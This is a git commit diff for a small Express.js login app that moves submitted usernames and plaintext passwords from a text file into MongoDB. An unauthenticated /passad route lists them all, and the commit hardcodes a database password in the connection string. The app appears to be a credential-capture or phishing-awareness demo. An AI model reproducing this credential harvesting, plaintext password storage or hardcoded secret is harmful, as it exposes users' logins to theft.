6a1744774c576f4b5b7da5d24eeb4db4f1e284e1
nirmit152007 <kiitcommon@gmail.com>
2023-08-10 08:26:49 +0530

    db added

--- index.js
+++ index.js
@@ -1,10 +1,27 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const fs = require('fs');
-const { Console } = require('console');
+const mongoose = require('mongoose');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+// Connect to MongoDB
+mongoose.connect('mongodb+srv://nirmit:Kiit%401521@cluster0.wdabg0l.mongodb.net/passad?retryWrites=true&w=majority', {
+    useNewUrlParser: true,
+    useUnifiedTopology: true
+}).then(() => {
+    console.log('Connected to MongoDB');
+}).catch(err => {
+    console.error('Error connecting to MongoDB:', err);
+});
+
+// Define a schema
+const userSchema = new mongoose.Schema({
+    uname: String,
+    password: String
+});
+
+const User = mongoose.model('User', userSchema);
 
 app.set('view engine', 'ejs');
 app.use(express.static('public'));
@@ -20,31 +37,42 @@ app.get('/login', (req, res) => {
     res.render('login');
 });
 
-//warning page
+// Warning page
 app.get('/warning', (req, res) => {
     res.render('warning');
 });
 
 // Handle login data
-app.post('/login', (req, res) => {
+app.post('/login', async (req, res) => {
     const { uname, password } = req.body;
-    // Save username and password to data.txt (not secure!)
-    fs.appendFile('data.txt', `${uname}: ${password}\n`, (err) => {
-        if (err) throw err;
-        console.log('Data saved to data.txt');
-        console.log(req.body);
-    });
-    res.redirect('/warning');
+
+    try {
+        const newUser = new User({
+            uname: uname,
+            password: password
+        });
+
+        await newUser.save();
+
+        console.log('Data saved to MongoDB:', newUser);
+        res.redirect('/warning');
+    } catch (err) {
+        console.error('Error saving data to MongoDB:', err);
+        res.status(500).send('Internal Server Error');
+    }
 });
 
-// Display data from data.txt
-app.get('/passad', (req, res) => {
-    fs.readFile('data.txt', 'utf8', (err, data) => {
-        if (err) throw err;
-        res.render('passad', { data });
-    });
+// Display data from MongoDB
+app.get('/passad', async (req, res) => {
+    try {
+        const users = await User.find();
+        res.render('passad', { data: users });
+    } catch (err) {
+        console.error('Error retrieving data from MongoDB:', err);
+        res.status(500).send('Internal Server Error');
+    }
 });
 
-app.listen(PORT, "0.0.0.0", () => {
+app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
